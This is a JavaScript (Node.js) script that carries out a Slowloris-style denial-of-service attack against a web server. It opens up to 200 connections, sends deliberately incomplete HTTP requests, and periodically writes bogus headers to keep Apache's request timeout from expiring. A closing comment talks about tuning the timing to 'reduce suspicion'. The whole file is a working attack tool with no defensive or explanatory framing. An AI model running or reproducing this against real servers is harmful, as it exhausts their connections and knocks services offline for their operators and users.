'use strict';

const net = require('net');
const maxConnections = 200; // Max connections
const host = '127.0.0.1';
const port = 80;

let connections= [];

function Connection(h, p) {
	this.state = 'active';
	this.t = Date.now();

	this.client = net.connect({port:p, host:h}, () => {
		this.client.write
		(
			 'GET / HTTP/1.1\r\nHost: '+ host +'\r\n' +
			 'UserAgent: user-agent' +
			 'Content-Length: ' + 1000*1000 + '\r\n' + // This is partial since it doesn't have two \r\n
			 'Keep-Alive: timeout=1000'
		);
	});

	this.client.on('data', (data) => {
		console.log('\t-Received '+ data.length +' bytes...');
		this.client.end();
	});

	this.client.on('end', () => {
		let d = Date.now() - this.t;
		this.state = 'ended';
		console.log('\t-Disconnected (duration: ' +
					(d/1000).toFixed(3) + ' seconds, connections remaining open: ' + connections.length +').');
	});

	this.client.on('error', (err) => {
		console.error('An error occured: ' + err);
		this.state = 'error';
	});

	connections.push(this);
}

/*
 * Send some more bogus data every 1000*1500ms to refresh
 * timout on server (Apache defaults to 300 sec)
 */
setInterval(() => {
	process.stdout.write('Resetting request time-out for each active connection ' + connections.length + '... ')
	connections.forEach(function(e, i, a) {
		if (e.state == 'active') e.client.write('X-a: 1' + '\r\n');
	});
	process.stdout.write('Done.\n');
}, 100*1500);

/*
 * Check active connection count and increment if
 * any have been killed
 */
setInterval(() => {
	let notify = false;

	// Add another connection if we haven't reached
	// our max:
	if(connections.length < maxConnections) {
		new Connection(host, port);
		notify = true;
	}

	// Remove dead connections
	connections = connections.filter(function(v) {
		return v.state=='active';
	});

	if(notify) {
		console.log('Active connections: ' + connections.length +
				' / ' + maxConnections);
	}
}, 100); // Something higher might reduce suspicion